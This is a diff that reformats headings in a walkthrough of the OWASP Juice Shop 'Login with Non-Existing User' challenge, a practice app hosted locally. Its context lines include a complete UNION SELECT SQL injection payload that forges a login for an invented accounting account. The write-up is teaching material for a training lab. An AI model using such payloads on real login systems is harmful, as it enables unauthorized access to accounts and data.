@@ -1,4 +1,4 @@
-OWASP Juice Shop: Login with Non-Existing User via SQL Injection
+#OWASP Juice Shop: Login with Non-Existing User via SQL Injection
 
 Challenge Overview
 
@@ -6,7 +6,7 @@ In web applications that construct SQL queries by concatenating user inputs dire
 
 Step-by-Step Breakdown
 
-1. Identifying the Vulnerability (DevTools Inspection)
+##1. Identifying the Vulnerability (DevTools Inspection)
 
 Access the application login interface at http://localhost:3000/#/login.
 
@@ -21,7 +21,7 @@ Inspect the HTTP 500 Internal Server Error response in the DevTools panel to vie
 }
 
 
-2. Determining the Database Schema
+##2. Determining the Database Schema
 
 A UNION SELECT statement requires that the injected query returns the exact number of columns with matching data types expected by the backend Users model.
 
@@ -53,7 +53,7 @@ updatedAt
 
 deletedAt
 
-3. Constructing the Payload
+##3. Constructing the Payload
 
 The payload must fulfill two objectives:
 
@@ -66,7 +66,7 @@ Payload Structure:
 ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
 
 
-4. Execution & Authentication Bypass
+##4. Execution & Authentication Bypass
 
 Enter the crafted payload into the Email input field.
 
